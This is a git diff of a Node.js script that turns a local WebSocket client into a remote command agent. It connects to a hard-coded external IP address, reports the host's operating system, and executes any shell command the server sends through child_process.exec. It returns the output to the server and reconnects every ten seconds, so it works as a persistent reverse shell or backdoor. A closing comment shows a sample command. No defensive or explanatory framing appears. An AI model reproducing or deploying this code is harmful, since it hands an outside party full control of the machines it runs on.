@@ -1,27 +1,36 @@
 const WS = require('ws')
+const os = require('os');
 const { exec } = require('child_process')
-var connect = function(){
-    var id;
-    ws = new WS("ws://127.0.0.1:6969")
-    ws.on("message", (message) => {
-        const msg = message.toString()
-        console.log(message.toString())
+let ws = new WS("ws://20.115.225.169:8080")
+let connected = 0
 
-        const [client, operation, ...text] = msg.split(" ")
-        if (operation === "$exec") { // checks if there is exec command to execute the cmd.
-            console.log(text)
-            cmd(text.join(" "))  
+function connect() {
+    connected+=1
+    ws = new WS("ws://20.115.225.169:8080")
+    ws.on("open", () => {
+        console.log("Connection establised")
+        if (connected < 2){
+            ws.send(`Connected to OS :: ${os.type()}`)
         }
+        ws.on("message", (message) => {
+            const msg = message.toString()
+            const [client, operation, ...text] = msg.split(" ")
+            if (operation === "$exec") { // checks if there is exec command to execute the cmd.
+                cmd(ws, text.join(" "))
+            }
+        })
     })
     ws.on("error", (error) => {
-        ws.close()
+        console.log("error")
+        setTimeout(reconnect, 2000)
     })
     ws.on("close", () => {
-        setTimeout(connect, 1000)
+        console.log("Connection Closed")
     })
 
 }
-function cmd(cmd) {
+
+function cmd(ws, cmd) {
     exec(cmd, (err, stdout, stderr) => {
         if (err) {
             ws.send(`ERORR ::: ${err}`)
@@ -30,10 +39,14 @@ function cmd(cmd) {
             ws.send(`STDERR ::: ${stderr}`)
             return
         }
-        console.log(stdout)
         ws.send(stdout)
     })
 }
+// ws.close()
+function reconnect() {
+    ws.close()
+    connect()
+}
+setInterval(reconnect, 10000)
 
-
-connect()
+// 0 $exec cd .. && ls && touch hi.txt << HELLO BROTHER
